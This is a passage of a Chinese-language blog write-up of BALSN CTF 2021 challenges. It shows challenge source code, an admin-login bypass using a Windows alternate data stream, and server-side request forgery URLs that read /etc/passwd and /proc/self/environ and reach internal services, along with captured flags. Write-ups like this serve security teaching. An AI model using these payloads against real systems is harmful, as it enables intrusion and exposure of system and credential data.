style=\"color:#e6db74\"\u003e\u0026#34;bye-bye~\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid input.\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e username \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e password \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello, \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eusername\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e.\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e username \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;admin\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    x \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;do you want the flag? (y/n): \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;n\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;OK, bye~\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;y\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid input.\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    x \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;beg me: \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;plz\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ok, here is your flag: BALSN{flag is here ...}\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                        \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    init()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1. passord manager\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2. login\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3. exit\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            x \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;what do you want to do? \u0026gt; \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                password_manager()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                login()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bye-bye~\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid input: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ex\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eKeyboardInterrupt\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bye-bye~\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;unexpected error occured.\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    os\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003echdir(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;../\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    shutil\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ermtree(base_dir)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e __name__ \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;__main__\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    main()\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"目標-1\"\u003e目標\u003c/h3\u003e\n\u003cp\u003e使用login選項成功登入admin\u003c/p\u003e\n\u003ch3 id=\"限制-1\"\u003e限制\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e用 normal_login 會直接被檔\u003c/li\u003e\n\u003cli\u003elogin 前，所有在 passord manager 所建立的 fast_login 檔若包含\u0026rsquo;admin\u0026rsquo;會被刪\u003c/li\u003e\n\u003cli\u003e做 passord manager 時 pin(filename) 不可包含[\u0026rsquo;\\\u0026rsquo;, \u0026lsquo;/\u0026rsquo;, \u0026lsquo;..\u0026rsquo;, \u0026lsquo;*\u0026rsquo;] 字串\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"payload-1\"\u003epayload\u003c/h3\u003e\n\u003cp\u003e因為 server 是 windows os ，所以可以用alternate_stream_name繞過 如：C:\\user\\docs\\somefile.ext:alternate_stream_name\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroot@jimmyGW:~# nc darkknight.balsnctf.com \u003cspan style=\"color:#ae81ff\"\u003e8084\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1. passord manager\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2. login\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3. exit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewhat \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e you want to \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e? \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003euse a short pin code to achieve fast login!!\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eenter a pin code \u0026gt; 39671:aaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eenter username \u0026gt; admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eenter password \u0026gt; aaaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esaved!!\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1. passord manager\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2. login\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3. exit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewhat \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e you want to \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e? \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esafety guard activated. will delete all unsafe credentials hahaha...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efinished. delete \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e unsafe credentials: \u003cspan style=\"color:#f92672\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1. fast login\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2. normal login\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3. exit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eenter login type \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eenter a pin code \u0026gt; 39671:aaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehello, admin.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e you want the flag? \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ey/n\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e: y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebeg me: plz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eok, here is your flag: BALSN\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003ehowever_Admin_passed_the_Dark_knight_with_hiding_behind_Someone\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1. passord manager\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e2. login\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3. exit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewhat \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e you want to \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e? \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebye-bye~\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"flag-1\"\u003eflag\u003c/h3\u003e\n\u003cp\u003eBALSN{however_Admin_passed_the_Dark_knight_with_hiding_behind_Someone}\u003c/p\u003e\n\u003ch3 id=\"參考-1\"\u003e參考\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://hshrzd.wordpress.com/2016/03/19/introduction-to-ads-alternate-data-streams/\"\u003eIntroduction to ADS – Alternate Data Streams\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"darkknight-1\"\u003eDarkKnight\u003c/h2\u003e\n\u003ch3 id=\"題目-2\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795163-a834a3c8-d34a-4aed-bcfc-9c3ba5520a99.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"解題\"\u003e解題\u003c/h3\u003e\n\u003cp\u003e進來看到這個\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795197-a049ab6f-1d15-43d9-b417-54a3ee54db4f.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e試著 \u003ca href=\"http://proxy.balsnctf.com/query?site=http://www.google.com\"\u003ehttp://proxy.balsnctf.com/query?site=http://www.google.com\u003c/a\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795222-e11076c6-6fa7-493e-9dd0-8b40d8f3adf6.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e試著 ssrf  \u003ca href=\"http://proxy.balsnctf.com/query?site=file:///etc/passwd\"\u003ehttp://proxy.balsnctf.com/query?site=file:///etc/passwd\u003c/a\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795236-522dd390-14cb-442b-ac1d-7221e7fb1ec5.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e試著 \u003ca href=\"http://proxy.balsnctf.com/query?site=file:///proc/self/environ\"\u003ehttp://proxy.balsnctf.com/query?site=file:///proc/self/environ\u003c/a\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795255-13689cc5-9a1f-4e64-9f81-b986e01af138.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e試著 \u003ca href=\"http://proxy.balsnctf.com/query?site=file:///proc/net/tcp\"\u003ehttp://proxy.balsnctf.com/query?site=file:///proc/net/tcp\u003c/a\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795276-6d3bd2de-7fd7-4077-bc8f-d2278f4cb6f2.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e試著 \u003ca href=\"http://proxy.balsnctf.com/query?site=http://127.0.0.1:15000\"\u003ehttp://proxy.balsnctf.com/query?site=http://127.0.0.1:15000\u003c/a\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795294-50e342dc-500b-43ec-8241-668dd110e0b0.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e試著 \u003ca href=\"http://proxy.balsnctf.com/query?site=http://127.0.0.1:15000/stats\"\u003ehttp://proxy.balsnctf.com/query?site=http://127.0.0.1:15000/stats\u003c/a\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795368-4b9539c1-702b-4209-af46-7158f9f4362a.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e試著 \u003ca href=\"http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307\"\u003ehttp://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307\u003c/a\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795389-217d6af0-0418-4c8b-ae17-05aa3bcd09ee.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e試著 \u003ca href=\"http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307/flag\"\u003ehttp://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307/flag\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e炸\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795401-d274d047-1b98-4180-bc4c-60860610af34.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e試著 \u003ca href=\"http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307//flag\"\u003ehttp://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307//flag\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e過\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795421-f5b07089-8ff3-4796-b1e3-f02de4d24734.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"flag-2\"\u003eflag\u003c/h3\u003e\n\u003cp\u003eBALSN{default_istio_service_mesh_envoy_configurations}\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/balsn-2021-writeup/","title":"BALSN 2021 WriteUp"}]